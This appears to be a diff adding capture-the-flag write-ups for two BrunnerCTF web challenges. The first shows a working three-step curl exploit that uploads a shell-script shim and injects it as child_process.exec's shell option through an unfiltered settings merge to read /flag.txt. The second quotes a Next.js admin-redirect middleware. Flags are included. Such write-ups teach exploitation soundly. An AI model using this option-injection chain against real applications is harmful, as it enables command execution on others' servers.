@@ -299,3 +299,77 @@ $flag = "brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}";
 ```
 
 flag: `brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}`
+
+## > Recipe For Disaster (Web)
+`/api/settings` does a deep merge of your JSON into `app.locals.settings`:
+```js
+deepMerge(app.locals.settings, req.body);
+```
+
+Later, /export uses those merged settings as options to child_process.exec:
+```js
+const baseOpts = Object.assign({}, app.locals.settings.exportOptions || {});
+const envFromSettings = baseOpts.env || {};      // (they try to delete env earlier)
+const env = Object.assign({}, process.env, envFromSettings);
+const opts = Object.assign({}, baseOpts, { cwd: __dirname, env });
+exec(cmd, opts, (err, stdout, stderr) => { ... });
+```
+
+they block `exportOptions.env` in `/api/settings`, but they don’t block `exportOptions.shell` (or other exec options like `uid`, `gid`, `timeout`, `maxBuffer`, etc.).
+
+`exec` will run your command through whatever shell you set in `opts.shell`. If we point `shell` to our own script, our script runs first and can print `/flag.txt` before delegating to a real shell.
+
+therefore, let's upload a shell and read the flag.
+
+```bash
+curl -s -X POST https://recipe-for-disaster-72bf042470e3a9aa.challs.brunnerne.xyz/api/note \
+  -H 'Content-Type: application/json' \
+  -d '{
+        "name": "brun1",
+        "filename": "sh",
+        "makeExecutable": true,
+        "content": "#!/bin/sh\ncat /flag.txt\nexec /bin/sh \"$@\""
+      }'
+
+```
+
+get the server to use our shell as shim:
+```bash
+curl -s -X POST https://recipe-for-disaster-72bf042470e3a9aa.challs.brunnerne.xyz/api/settings \
+  -H 'Content-Type: application/json' \
+  -d '{ "exportOptions": { "shell": "./data/brun1/sh" } }'
+
+```
+
+run shim:
+
+```bash
+curl -s "https://recipe-for-disaster-72bf042470e3a9aa.challs.brunnerne.xyz/export?name=brun1"
+```
+
+flag: `brunnerCTF{pr0t0typ3_p011u710n_0v3rfl0w1ng_7h3_0v3n}`
+
+## > EPIC CAKE BATTLES OF HISTORY!!! (Web)
+
+requests to `/admin` trigger a `middleware.ts` which redirects you back to `/` if you arent admin:
+```typescript
+import { NextResponse } from 'next/server'
+import type { NextRequest } from 'next/server'
+
+// This function can be marked `async` if using `await` inside
+export function middleware(request: NextRequest) {
+  // @ts-ignore
+    if("CHAMPION" == "FOUND")
+        return NextResponse.redirect(new URL('/admin', request.url))
+  return NextResponse.redirect(new URL('/', request.url))
+}
+
+// See "Matching Paths" below to learn more
+export const config = {
+  matcher: '/admin/:path*',
+}
+
+```
+
+which is effectively impossible to override because the check is hardcoded
+
